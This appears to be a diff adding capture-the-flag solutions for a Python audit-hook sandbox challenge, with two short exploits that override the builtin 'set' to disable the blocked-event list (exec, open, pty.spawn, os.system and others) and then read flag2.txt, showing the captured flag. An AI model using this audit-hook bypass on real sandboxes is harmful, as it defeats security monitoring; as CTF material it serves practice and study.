@@ -1,0 +1,14 @@
+============= Solution 1 =============
+
+__builtins__['set'] = lambda x: {'builtins.input', 'builtins.input/result', 'exec', 'compile', 'open', 'import', 'code.__new__', 'pty.spawn', 'os.forkpty', 'os.system'}
+
+open('flag2.txt').read()
+```
+'sdctf{4ud1t_hO0ks_aR3_N0T_SaNDB0x35}\n'
+```
+
+============= Solution 2 =============
+import sys
+import os
+sys.modules["builtins"].set = lambda x : list(x) + ["os.system"]
+os.system("cat flag2.txt")
